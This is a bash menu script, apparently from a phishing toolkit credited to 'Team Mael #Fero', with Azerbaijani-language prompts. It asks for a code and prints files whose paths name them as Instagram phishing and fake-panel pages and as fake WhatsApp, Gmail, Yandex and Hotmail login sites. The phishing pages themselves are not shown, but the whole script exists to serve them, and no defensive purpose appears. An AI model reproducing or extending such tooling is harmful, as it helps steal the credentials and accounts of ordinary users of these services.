#!/bin/bash
clear
echo -e  "


\e[35m     ((( #Team Mael #Fero )))


"

echo -e "\e[31m"
read -p "Kodunuzu  Yazın: " islem
if [[ $islem == "insta01" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-phishing/username-phishing.txt

elif [[ $islem == "insta02" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-fakepanel/username-fakepanel.txt



elif [[ $islem == "whatsapp01" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır...."
sleep 2
echo -e "\e[37m"
cat Whatsapp/Site/code.txt



elif [[ $islem == "mail01" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır....."
sleep 2
echo -e "\e[37m"
cat Mail/Site-gmail/gmail.txt

elif [[ $islem == "mail02" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-yandex/yandex.txt

elif [[ $islem == "mail03" ]]; then
sleep 1
echo ""
echo -e "\e[33mİnformasiya Alınır...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-hotmail/hotmail.txt
else
	clear
        echo -e "\e[31mSehv Kod Yazdınız...."
	sleep 3
        bash code.sh
fi
echo -e "\e[31m"
read -p "Ana Menüye Qayıtmaq Üçün Entere Basın...." non
cd ..
bash tst.sh
